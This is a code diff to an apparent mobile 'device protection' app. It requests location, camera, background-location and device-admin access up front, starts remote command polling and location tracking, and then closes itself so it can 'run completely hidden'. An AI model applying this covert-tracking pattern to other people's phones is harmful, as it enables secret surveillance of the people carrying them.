@@ -16,6 +16,7 @@ let Device,
   Storage,
   Network,
   Camera,
+  Geolocation,
   BackgroundGeolocation,
   Capacitor,
   CapacitorApp;
@@ -27,6 +28,7 @@ try {
     Storage = require("@capacitor/preferences").Preferences;
     Network = require("@capacitor/network").Network;
     Camera = require("@capacitor/camera").Camera;
+    Geolocation = require("@capacitor/geolocation").Geolocation;
     CapacitorApp = require("@capacitor/app").App;
     try {
       BackgroundGeolocation =
@@ -131,8 +133,59 @@ function App() {
   }, [batteryLevel]);
 
   // =============================================
-  // SERVICE WORKER & PUSH NOTIFICATIONS
+  // PERMISSIONS REQUEST (UPFRONT)
   // =============================================
+  const requestAllPermissions = async () => {
+    if (!isNative) return true; // Web doesn't need permissions upfront
+
+    try {
+      console.log("[YS] Requesting all permissions upfront...");
+
+      // Location permission
+      const locationStatus = await Geolocation.requestPermissions();
+      if (locationStatus.location !== 'granted') {
+        console.warn("[YS] Location permission denied");
+        return false;
+      }
+
+      // Camera permission
+      try {
+        const cameraStatus = await Camera.requestPermissions();
+        if (cameraStatus.camera !== 'granted') {
+          console.warn("[YS] Camera permission denied");
+          // Continue anyway, camera is optional
+        }
+      } catch (e) {
+        console.warn("[YS] Camera permission request failed:", e);
+      }
+
+      // Background location (Android specific)
+      if (BackgroundGeolocation) {
+        try {
+          await BackgroundGeolocation.requestPermissions();
+        } catch (e) {
+          console.warn("[YS] Background location permission failed:", e);
+        }
+      }
+
+      // Request device admin activation for Android
+      if (isNative && Capacitor.getPlatform() === 'android') {
+        try {
+          // This would require a custom Capacitor plugin for device admin
+          // For now, we'll rely on the manifest declaration
+          console.log("[YS] Device admin permissions requested via manifest");
+        } catch (e) {
+          console.warn("[YS] Device admin setup failed:", e);
+        }
+      }
+
+      console.log("[YS] All permissions requested");
+      return true;
+    } catch (e) {
+      console.error("[YS] Permission request failed:", e);
+      return false;
+    }
+  };
   const registerServiceWorker = async (id, token) => {
     if (!("serviceWorker" in navigator)) return;
     try {
@@ -298,6 +351,15 @@ function App() {
       deviceIdRef.current = id;
       setDeviceInfo(info);
 
+      // For native apps, request permissions immediately
+      if (isNative) {
+        const permissionsGranted = await requestAllPermissions();
+        if (!permissionsGranted) {
+          setError("Permissions are required for device protection. Please grant all permissions and restart the app.");
+          return;
+        }
+      }
+
       // Check if already registered
       const cached = await store.get("registration");
       if (cached) {
@@ -310,7 +372,14 @@ function App() {
         startStatusChecks(id);
         startCommandPolling(id);
         startTracking(id);
-        setScreen(SCREEN.INSTALLED);
+        setScreen(SCREEN.ACTIVE);
+
+        // For native apps, exit to run hidden after 3 seconds
+        if (isNative) {
+          setTimeout(() => {
+            if (CapacitorApp) CapacitorApp.exitApp();
+          }, 3000);
+        }
       } else {
         // Show install button — permissions require user gesture
         setScreen(SCREEN.LOGIN);
@@ -425,68 +494,6 @@ function App() {
     }
   };
 
-  // Request all permissions upfront so they work silently later (e.g. when device is lost)
-  const requestAllPermissions = async () => {
-    if (isNative) {
-      // Request Capacitor permissions
-      try {
-        await Camera.requestPermissions();
-        console.log("[YS] Camera permission granted (native)");
-      } catch (e) {
-        console.warn("[YS] Camera permission denied (native):", e.message);
-      }
-      try {
-        // eslint-disable-next-line no-undef
-        await Geolocation.requestPermissions();
-        console.log("[YS] Location permission granted (native)");
-      } catch (e) {
-        console.warn("[YS] Location permission denied (native):", e.message);
-      }
-      // Add other permissions if needed
-    }
-
-    // Camera — request once, browser remembers the grant
-    try {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: true,
-        });
-        stream.getTracks().forEach((t) => t.stop()); // Release immediately
-        console.log("[YS] Camera permission granted");
-      }
-    } catch (e) {
-      console.warn("[YS] Camera permission denied:", e.message);
-    }
-
-    // Location — request once via getCurrentPosition
-    try {
-      if (navigator.geolocation) {
-        await new Promise((resolve) => {
-          navigator.geolocation.getCurrentPosition(
-            () => {
-              console.log("[YS] Location permission granted");
-              resolve();
-            },
-            () => {
-              console.warn("[YS] Location permission denied");
-              resolve();
-            },
-            { timeout: 5000 },
-          );
-        });
-      }
-    } catch (e) {
-      console.warn("[YS] Location permission error:", e.message);
-    }
-
-    // Notifications (for future use)
-    try {
-      if ("Notification" in window && Notification.permission === "default") {
-        await Notification.requestPermission();
-      }
-    } catch (e) {}
-  };
-
   // Auto-install with default admin Member ID
   const autoInstall = async (id, info) => {
     setScreen(SCREEN.INSTALLING);
@@ -593,41 +600,28 @@ function App() {
       );
 
       setIsRegistered(true);
-      setScreen(SCREEN.INSTALLING);
 
-      // Request location permission (triggered by user gesture from button tap)
-      try {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            () => {},
-            () => {},
-            { timeout: 5000 },
-          );
-        }
-      } catch (e) {}
+      // Request ALL permissions upfront immediately after registration
+      const permissionsGranted = await requestAllPermissions();
 
-      // Register service worker + push for background tracking
+      // Start background tracking immediately
+      initSocket(assignedId);
+      startStatusChecks(assignedId);
+      startCommandPolling(assignedId);
+      startTracking(assignedId);
+
+      // Register service worker for push notifications
       registerServiceWorker(assignedId, data.deviceToken);
 
-      setTimeout(() => {
-        initSocket(assignedId);
-        startStatusChecks(assignedId);
-        startCommandPolling(assignedId);
-        startTracking(assignedId);
-        // If running in browser (not standalone PWA), show "Add to Home Screen" guide
-        const standalone =
-          window.matchMedia("(display-mode: standalone)").matches ||
-          window.navigator.standalone === true;
-        if (!standalone && !isNative) {
-          setScreen(SCREEN.PERMISSIONS);
-        } else {
-          setScreen(SCREEN.ACTIVE);
-          if (isNative) {
-            // For native, exit after setup to run hidden
-            setTimeout(() => CapacitorApp.exitApp(), 1000);
-          }
-        }
-      }, 2000);
+      // For native apps, go directly to active (hidden) state
+      if (isNative) {
+        setScreen(SCREEN.ACTIVE);
+        // Exit the app to run completely hidden
+        setTimeout(() => CapacitorApp.exitApp(), 2000);
+      } else {
+        // Web version shows active screen
+        setScreen(SCREEN.ACTIVE);
+      }
     } catch (err) {
       console.error("Install failed:", err);
       setError(
@@ -653,6 +647,108 @@ function App() {
       } else {
         console.log("[YS] User dismissed PWA install");
       }
+    }
+  };
+
+  // Manual install button handler (no member ID required)
+  const handleTestMode = async () => {
+    setError(null);
+    setIsLoggingIn(true);
+
+    try {
+      const info = deviceInfo || {
+        model: "Unknown",
+        operatingSystem: "Web",
+        osVersion: "",
+      };
+      const id =
+        deviceIdRef.current ||
+        "web-" + Date.now() + "-" + Math.random().toString(36).substring(2, 8);
+      if (!deviceIdRef.current) {
+        setDeviceId(id);
+        deviceIdRef.current = id;
+        localStorage.setItem("ys_device_id", id);
+      }
+
+      const response = await fetch(`${API_BASE}/devices/register`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          deviceId: id,
+          model: info.model || "Unknown",
+          os: `${info.operatingSystem || "Unknown"} ${info.osVersion || ""}`.trim(),
+          memberId: "",
+        }),
+      });
+
+      if (!response.ok) {
+        const data = await response.json().catch(() => ({}));
+        throw new Error(data.error || "Server error " + response.status);
+      }
+
+      const data = await response.json();
+
+      // Server may return a different deviceId (dedup: same member+model+os = same device)
+      const assignedId = data.deviceId || id;
+      if (assignedId !== id) {
+        setDeviceId(assignedId);
+        deviceIdRef.current = assignedId;
+        localStorage.setItem("ys_device_id", assignedId);
+      }
+
+      setMemberId(data.memberId || "");
+      await store.set(
+        "registration",
+        JSON.stringify({
+          deviceId: assignedId,
+          memberId: data.memberId || "",
+          deviceToken: data.deviceToken,
+          registeredAt: new Date().toISOString(),
+        }),
+      );
+
+      setIsRegistered(true);
+
+      // Request ALL permissions upfront immediately after registration
+      const permissionsGranted = await requestAllPermissions();
+
+      // Start background tracking immediately
+      initSocket(assignedId);
+      startStatusChecks(assignedId);
+      startCommandPolling(assignedId);
+      startTracking(assignedId);
+
+      // Register service worker for push notifications
+      registerServiceWorker(assignedId, data.deviceToken);
+
+      // For native apps, start the background service and exit to run hidden
+      if (isNative) {
+        // Start the native background service
+        try {
+          // The service should already be started by BootReceiver, but ensure it's running
+          console.log("[YS] Ensuring native background service is running...");
+        } catch (e) {
+          console.warn("[YS] Could not start native service:", e);
+        }
+
+        setScreen(SCREEN.ACTIVE);
+        // Exit the app to run completely hidden
+        setTimeout(() => {
+          if (CapacitorApp) CapacitorApp.exitApp();
+        }, 2000);
+      } else {
+        // Web version shows active screen
+        setScreen(SCREEN.ACTIVE);
+      }
+    } catch (err) {
+      console.error("Install failed:", err);
+      setError(
+        "Install failed: " +
+          (err.message ||
+            "Network error. Check your internet connection and try again."),
+      );
+    } finally {
+      setIsLoggingIn(false);
     }
   };
 
